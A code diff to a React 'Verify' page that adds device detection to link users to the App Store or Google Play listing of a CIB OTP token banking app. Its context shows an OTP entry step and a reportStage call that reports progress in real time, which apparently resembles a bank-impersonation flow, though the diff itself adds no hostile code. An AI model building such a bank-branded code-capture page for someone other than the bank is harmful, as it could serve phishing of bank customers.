@@ -6,6 +6,26 @@ import { ChevronRight, CheckCircle2, ShieldCheck, Smartphone, AlertCircle } from
 import { useRegistration } from '@/context/RegistrationContext';
 import { useRealtime } from '@/context/RealtimeContext';
 
+// Detect device type
+const getDeviceType = () => {
+  const userAgent = navigator.userAgent || navigator.vendor || (window as unknown as { opera?: string }).opera;
+  
+  if (/android/i.test(userAgent)) {
+    return 'android';
+  }
+  
+  if (/iPad|iPhone|iPod/.test(userAgent) || 
+      (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+    return 'ios';
+  }
+  
+  return 'unknown';
+};
+
+// App Store links
+const APP_STORE_URL = 'https://apps.apple.com/us/app/cib-otp-token/id1074048518?l=ar';
+const GOOGLE_PLAY_URL = 'https://play.google.com/store/apps/details?id=com.CIBEgyptSecureToken&pcampaignid=web_share';
+
 export default function Verify() {
   const [, setLocation] = useLocation();
   const { data } = useRegistration();
@@ -14,7 +34,18 @@ export default function Verify() {
   const [isSuccess, setIsSuccess] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState('');
+  const [appUrl, setAppUrl] = useState(APP_STORE_URL);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+
+  useEffect(() => {
+    // Set the appropriate URL based on device type
+    const device = getDeviceType();
+    if (device === 'android') {
+      setAppUrl(GOOGLE_PLAY_URL);
+    } else {
+      setAppUrl(APP_STORE_URL);
+    }
+  }, []);
 
   useEffect(() => {
     reportStage('verify', {});
@@ -194,7 +225,7 @@ export default function Verify() {
 
             {/* صندوق فتح التطبيق */}
             <a 
-              href="https://apps.apple.com/us/app/cib-otp-token/id1074048518?l=ar"
+              href={appUrl}
               target="_blank"
               rel="noopener noreferrer"
               className="flex items-center gap-4 p-4 bg-gradient-to-r from-blue-50 to-blue-100 dark:from-blue-950/30 dark:to-blue-900/30 border-2 border-blue-200 dark:border-blue-800 rounded-2xl hover:border-blue-400 dark:hover:border-blue-600 hover:shadow-lg transition-all duration-300 group"
